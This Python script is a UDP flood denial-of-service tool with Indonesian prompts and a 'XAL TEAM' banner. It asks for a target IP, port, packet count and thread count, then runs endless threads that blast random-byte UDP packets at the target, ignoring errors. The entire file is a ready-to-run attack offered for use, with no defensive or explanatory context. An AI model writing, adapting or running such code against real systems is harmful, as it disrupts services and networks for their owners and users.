import random
import socket
import threading
import os,sys

os.system("clear")
print("Custom sendiri")
ip = str(input("MASUKIN IPNYA | Target IP:"))
port = int(input("MASUKIN PORTNYA | Target Port:"))
choice = str(input("GAS GA NI? (y/n):"))
times = int(input("PACKETNYA BERAPA | Packet :"))
threads = int(input("MAU BERAPA LAMA |Threads:"))

os.system("clear")
def run():
	data = random._urandom(1080)
	i = random.choice(("[•]","[•]","[•]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" XAL TEAM NIH BOSS!!!")
		except:
			print("[X] AMPUN BANG!!!")

def run2():
	data = random._urandom(1025)
	i = random.choice(("[•]","[•]","[•]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" XAL TEAM NIH BOSS!!!")
		except:
			s.close()
			print("[X] AMPUN BANG")

def run3():
	data = random._urandom(16)
	i = random.choice(("[•]","[•]","[•]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" XAL TEAM NIH BOSS!!!")
		except:
			s.close()
			print("[X] AMPUN BANG")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
		th = threading.Thread(target = run2)
		th.start()
	else:
		th = threading.Thread(target = run3)
		th.start()
